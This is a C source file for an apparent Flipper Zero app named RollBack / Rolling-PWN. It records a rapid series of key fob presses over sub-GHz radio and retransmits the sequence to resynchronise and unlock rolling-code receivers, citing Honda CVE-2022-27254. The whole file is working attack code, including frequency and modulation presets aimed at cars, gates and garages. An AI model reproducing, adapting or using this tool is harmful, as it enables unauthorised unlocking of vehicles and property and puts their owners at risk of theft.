/**
 * RollBack / Rolling-PWN — consecutive-code capture & sequence replay.
 *
 * Several rolling-code receivers accept a REPLAYED consecutive sequence of codes,
 * which resynchronises (rolls back) their counter and revalidates the codes in
 * that window (Honda Rolling-PWN CVE-2022-27254 and the broader RollBack class).
 *
 * Flow: CAPTURE — hold the app on the fob's frequency/preset and press the fob a
 * handful of times QUICKLY; the raw demodulated transitions (bursts + the short
 * gaps between them) are buffered as one continuous sequence. REPLAY — retransmit
 * that whole sequence, N times, re-modulated with the same preset. No decode/crypto:
 * works on any protocol whose receiver honours a consecutive-sequence resync.
 *
 * Protocol-agnostic (OOK fixed-code and 2-FSK rolling like Honda). Not a crack —
 * encrypted AES fobs (KIA/Hyundai/VAG) won't resync from replay.
 *
 * NOTE: KeeLoq "predict next code" is a different, crypto attack and is already
 * native in the SubGHz app (decode a KeeLoq signal whose mfr key is in the
 * keystore, then Send -> it transmits cnt+1 re-encrypted).
 */
#include <furi.h>
#include <furi_hal_power.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/modules/variable_item_list.h>
#include <gui/modules/popup.h>
#include <toolbox/level_duration.h>

#include <lib/subghz/devices/devices.h>
#include <lib/subghz/devices/preset.h>

#define TAG "SubGhzRollBack"

#define RB_BUF_CAP 8192u // LevelDuration transitions (~a dozen fob presses)
#define RB_GAP_US 25000u // low >25ms => inter-press gap (press separator)
#define RB_GAP_CAP_US 40000u // truncate stored inter-press gaps to keep replay tight

static const uint32_t RB_FREQS[] = {433920000, 315000000, 434420000, 868350000, 434790000};
static const char* const RB_FREQ_NAMES[] = {"433.92", "315.00", "434.42", "868.35", "434.79"};
#define RB_FREQ_COUNT (sizeof(RB_FREQS) / sizeof(RB_FREQS[0]))

typedef struct {
    const char* name;
    FuriHalSubGhzPreset preset;
} RbPreset;
static const RbPreset RB_PRESETS[] = {
    {"OOK 650", FuriHalSubGhzPresetOok650Async}, // fixed-code garages/gates
    {"2FSK 47k", FuriHalSubGhzPreset2FSKDev476Async}, // wide FSK (Honda etc.)
    {"2FSK 2.4k", FuriHalSubGhzPreset2FSKDev238Async}, // narrow FSK
    {"OOK 270", FuriHalSubGhzPresetOok270Async},
};
#define RB_PRESET_COUNT (sizeof(RB_PRESETS) / sizeof(RB_PRESETS[0]))

#define RB_REPEATS_MAX 5

typedef enum {
    RbViewConfig,
    RbViewPopup,
} RbView;

typedef enum {
    RbEvtCaptureDone = 100,
    RbEvtReplayDone,
} RbEvent;

typedef struct {
    LevelDuration* buf;
    size_t cap;
    volatile size_t len; // captured transitions
    volatile uint32_t presses; // gap count (press separators seen)
    volatile bool capturing;
    // replay walker
    volatile size_t rp_idx;
    volatile uint8_t rp_rep;
    uint8_t rp_reps;
    volatile bool replaying;
} RbState;

typedef struct {
    Gui* gui;
    ViewDispatcher* view_dispatcher;
    VariableItemList* list;
    Popup* popup;
    FuriTimer* ui_timer;

    uint8_t freq_idx;
    uint8_t preset_idx;
    uint8_t reps_idx;

    FuriThread* worker;
    bool busy;
    RbState st;
    char popup_text[128];
} RbApp;

/* ---- ISR/timer-context radio callbacks (no malloc/log/locks) ---- */

static void rb_capture_cb(bool level, uint32_t duration, void* ctx) {
    RbApp* app = ctx;
    RbState* s = &app->st;
    if(!s->capturing || s->len >= s->cap) return;
    if(!level && duration > RB_GAP_US) {
        s->presses++;
        if(duration > RB_GAP_CAP_US) duration = RB_GAP_CAP_US; // keep replay tight
    }
    s->buf[s->len++] = level_duration_make(level, duration);
}

static LevelDuration rb_replay_yield(void* ctx) {
    RbApp* app = ctx;
    RbState* s = &app->st;
    if(!s->replaying || s->len == 0 || s->rp_rep >= s->rp_reps) return level_duration_reset();
    LevelDuration ld = s->buf[s->rp_idx];
    if(++s->rp_idx >= s->len) {
        s->rp_idx = 0;
        s->rp_rep++;
    }
    return ld;
}

/* ---- device helper ---- */
static const SubGhzDevice* rb_device_up(void) {
    subghz_devices_init();
    uint8_t att = 0;
    while(!furi_hal_power_is_otg_enabled() && att++ < 5) {
        furi_hal_power_enable_otg();
        furi_delay_ms(10);
    }
    const SubGhzDevice* device = subghz_devices_get_by_name("cc1101_ext");
    if(!device) device = subghz_devices_get_by_name("cc1101_int");
    if(device) subghz_devices_begin(device);
    return device;
}
static void rb_device_down(const SubGhzDevice* device) {
    if(device) {
        subghz_devices_idle(device);
        subghz_devices_sleep(device);
        subghz_devices_end(device);
    }
    if(furi_hal_power_is_otg_enabled()) furi_hal_power_disable_otg();
    subghz_devices_deinit();
}

/* ---- workers ---- */
static int32_t rb_capture_worker(void* context) {
    RbApp* app = context;
    const SubGhzDevice* device = rb_device_up();
    if(device) {
        subghz_devices_reset(device);
        subghz_devices_idle(device);
        subghz_devices_load_preset(device, RB_PRESETS[app->preset_idx].preset, NULL);
        subghz_devices_set_frequency(device, RB_FREQS[app->freq_idx]);
        app->st.len = 0;
        app->st.presses = 0;
        app->st.capturing = true;
        subghz_devices_start_async_rx(device, rb_capture_cb, app);
        while(app->st.capturing) furi_delay_ms(20); // Back clears capturing
        subghz_devices_stop_async_rx(device);
    }
    rb_device_down(device);
    view_dispatcher_send_custom_event(app->view_dispatcher, RbEvtCaptureDone);
    return 0;
}

static int32_t rb_replay_worker(void* context) {
    RbApp* app = context;
    const SubGhzDevice* device = rb_device_up();
    if(device && app->st.len > 0) {
        subghz_devices_reset(device);
        subghz_devices_idle(device);
        subghz_devices_load_preset(device, RB_PRESETS[app->preset_idx].preset, NULL);
        subghz_devices_set_frequency(device, RB_FREQS[app->freq_idx]);
        if(subghz_devices_set_tx(device)) {
            app->st.rp_idx = 0;
            app->st.rp_rep = 0;
            app->st.rp_reps = app->reps_idx + 1;
            app->st.replaying = true;
            subghz_devices_start_async_tx(device, rb_replay_yield, app);
            uint32_t guard = 0;
            while(app->st.replaying && !subghz_devices_is_async_complete_tx(device) &&
                  guard++ < 12000) {
                furi_delay_ms(10);
            }
            subghz_devices_stop_async_tx(device);
        }
    }
    rb_device_down(device);
    view_dispatcher_send_custom_event(app->view_dispatcher, RbEvtReplayDone);
    return 0;
}

/* ---- UI ---- */
static void rb_show_capture_popup(RbApp* app) {
    snprintf(
        app->popup_text,
        sizeof(app->popup_text),
        "%s MHz  %s\nPress fob 5-8x FAST\npresses:0  samp:0\nBack = done",
        RB_FREQ_NAMES[app->freq_idx],
        RB_PRESETS[app->preset_idx].name);
    popup_reset(app->popup);
    popup_set_header(app->popup, "Capturing", 64, 6, AlignCenter, AlignTop);
    popup_set_text(app->popup, app->popup_text, 64, 24, AlignCenter, AlignTop);
}

static void rb_start_capture(RbApp* app) {
    if(app->busy) return;
    app->busy = true;
    rb_show_capture_popup(app);
    view_dispatcher_switch_to_view(app->view_dispatcher, RbViewPopup);
    furi_timer_start(app->ui_timer, furi_ms_to_ticks(250));
    app->worker = furi_thread_alloc_ex("RbCap", 2048, rb_capture_worker, app);
    furi_thread_start(app->worker);
}

static void rb_start_replay(RbApp* app) {
    if(app->busy) return;
    if(app->st.len == 0) return; // nothing captured
    app->busy = true;
    snprintf(
        app->popup_text,
        sizeof(app->popup_text),
        "%s MHz  %s\n~%lu presses  x%u\nsamp:%lu\nBack = stop",
        RB_FREQ_NAMES[app->freq_idx],
        RB_PRESETS[app->preset_idx].name,
        (unsigned long)app->st.presses,
        (unsigned)(app->reps_idx + 1),
        (unsigned long)app->st.len);
    popup_reset(app->popup);
    popup_set_header(app->popup, "Replaying", 64, 6, AlignCenter, AlignTop);
    popup_set_text(app->popup, app->popup_text, 64, 24, AlignCenter, AlignTop);
    view_dispatcher_switch_to_view(app->view_dispatcher, RbViewPopup);
    app->worker = furi_thread_alloc_ex("RbTx", 2048, rb_replay_worker, app);
    furi_thread_start(app->worker);
}

// periodic UI refresh while capturing
static void rb_ui_timer_cb(void* context) {
    RbApp* app = context;
    if(!app->st.capturing) return;
    snprintf(
        app->popup_text,
        sizeof(app->popup_text),
        "%s MHz  %s\nPress fob 5-8x FAST\npresses:%lu  samp:%lu\nBack = done",
        RB_FREQ_NAMES[app->freq_idx],
        RB_PRESETS[app->preset_idx].name,
        (unsigned long)app->st.presses,
        (unsigned long)app->st.len);
    popup_set_text(app->popup, app->popup_text, 64, 24, AlignCenter, AlignTop);
}

// OK on Capture(row 3) / Replay(row 4)
static void rb_list_enter_callback(void* context, uint32_t index) {
    RbApp* app = context;
    if(index == 3) rb_start_capture(app);
    else if(index == 4) rb_start_replay(app);
}

static void rb_freq_changed(VariableItem* item) {
    RbApp* app = variable_item_get_context(item);
    app->freq_idx = variable_item_get_current_value_index(item);
    variable_item_set_current_value_text(item, RB_FREQ_NAMES[app->freq_idx]);
}
static void rb_preset_changed(VariableItem* item) {
    RbApp* app = variable_item_get_context(item);
    app->preset_idx = variable_item_get_current_value_index(item);
    variable_item_set_current_value_text(item, RB_PRESETS[app->preset_idx].name);
}
static void rb_reps_changed(VariableItem* item) {
    RbApp* app = variable_item_get_context(item);
    app->reps_idx = variable_item_get_current_value_index(item);
    char b[8];
    snprintf(b, sizeof(b), "%u", (unsigned)(app->reps_idx + 1));
    variable_item_set_current_value_text(item, b);
}

// Back on the popup: finish capture / stop replay (worker unwinds, posts *Done)
static bool rb_popup_input_callback(InputEvent* event, void* context) {
    RbApp* app = context;
    if(event->type == InputTypeShort && event->key == InputKeyBack) {
        app->st.capturing = false;
        app->st.replaying = false;
        return true;
    }
    return false;
}

static bool rb_custom_event_callback(void* context, uint32_t event) {
    RbApp* app = context;
    if(event == RbEvtCaptureDone || event == RbEvtReplayDone) {
        if(event == RbEvtCaptureDone) furi_timer_stop(app->ui_timer);
        if(app->worker) {
            furi_thread_join(app->worker);
            furi_thread_free(app->worker);
            app->worker = NULL;
        }
        app->busy = false;
        view_dispatcher_switch_to_view(app->view_dispatcher, RbViewConfig);
        return true;
    }
    return false;
}

static bool rb_nav_callback(void* context) {
    RbApp* app = context;
    if(app->busy) {
        app->st.capturing = false;
        app->st.replaying = false;
        return true; // *Done returns us to config
    }
    view_dispatcher_stop(app->view_dispatcher);
    return true;
}

static RbApp* rb_app_alloc(void) {
    RbApp* app = malloc(sizeof(RbApp));
    memset(app, 0, sizeof(RbApp));

    app->st.buf = malloc(sizeof(LevelDuration) * RB_BUF_CAP);
    app->st.cap = RB_BUF_CAP;

    app->gui = furi_record_open(RECORD_GUI);
    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);
    view_dispatcher_set_custom_event_callback(app->view_dispatcher, rb_custom_event_callback);
    view_dispatcher_set_navigation_event_callback(app->view_dispatcher, rb_nav_callback);

    app->ui_timer = furi_timer_alloc(rb_ui_timer_cb, FuriTimerTypePeriodic, app);

    app->list = variable_item_list_alloc();
    VariableItem* it;
    it = variable_item_list_add(app->list, "Frequency", RB_FREQ_COUNT, rb_freq_changed, app);
    variable_item_set_current_value_index(it, 0);
    variable_item_set_current_value_text(it, RB_FREQ_NAMES[0]);

    it = variable_item_list_add(app->list, "Preset", RB_PRESET_COUNT, rb_preset_changed, app);
    variable_item_set_current_value_index(it, 0);
    variable_item_set_current_value_text(it, RB_PRESETS[0].name);

    it = variable_item_list_add(app->list, "Repeats", RB_REPEATS_MAX, rb_reps_changed, app);
    variable_item_set_current_value_index(it, 1); // default 2 passes
    app->reps_idx = 1;
    variable_item_set_current_value_text(it, "2");

    variable_item_list_add(app->list, "Capture Sequence", 0, NULL, app); // row 3
    variable_item_list_add(app->list, "Replay Sequence", 0, NULL, app); // row 4
    variable_item_list_set_enter_callback(app->list, rb_list_enter_callback, app);
    view_dispatcher_add_view(
        app->view_dispatcher, RbViewConfig, variable_item_list_get_view(app->list));

    app->popup = popup_alloc();
    view_set_previous_callback(popup_get_view(app->popup), NULL);
    view_set_input_callback(popup_get_view(app->popup), rb_popup_input_callback);
    view_set_context(popup_get_view(app->popup), app);
    view_dispatcher_add_view(app->view_dispatcher, RbViewPopup, popup_get_view(app->popup));

    return app;
}

static void rb_app_free(RbApp* app) {
    if(app->worker) {
        app->st.capturing = false;
        app->st.replaying = false;
        furi_thread_join(app->worker);
        furi_thread_free(app->worker);
    }
    furi_timer_stop(app->ui_timer);
    furi_timer_free(app->ui_timer);
    view_dispatcher_remove_view(app->view_dispatcher, RbViewConfig);
    view_dispatcher_remove_view(app->view_dispatcher, RbViewPopup);
    variable_item_list_free(app->list);
    popup_free(app->popup);
    view_dispatcher_free(app->view_dispatcher);
    furi_record_close(RECORD_GUI);
    free(app->st.buf);
    free(app);
}

int32_t subghz_rollback_app(void* p) {
    UNUSED(p);
    RbApp* app = rb_app_alloc();
    view_dispatcher_switch_to_view(app->view_dispatcher, RbViewConfig);
    view_dispatcher_run(app->view_dispatcher);
    rb_app_free(app);
    return 0;
}
